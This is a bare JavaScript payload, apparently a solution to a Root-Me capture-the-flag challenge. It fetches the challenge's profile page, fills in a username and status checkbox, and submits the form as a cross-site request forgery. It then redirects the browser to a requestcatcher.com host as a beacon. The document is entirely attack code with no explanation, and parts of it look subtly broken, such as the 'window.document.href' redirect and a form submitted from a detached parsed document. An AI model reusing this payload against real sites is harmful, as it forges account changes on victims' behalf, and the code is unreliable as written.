const fn = async () => {
const req = await fetch('http://challenge01.root-me.org/web-client/ch23/index.php?action=profile');
const resp = await req.text();

const parser = new DOMParser();
const doc = parser.parseFromString(resp, "text/html");
const form = doc.querySelector('form');
const input = doc.querySelector('#username').value = "test1";
const status = doc.querySelector('#status').checked = true;
form.submit()

window.document.href = `https://tyyhty.requestcatcher.com/reussi`;



};

fn()
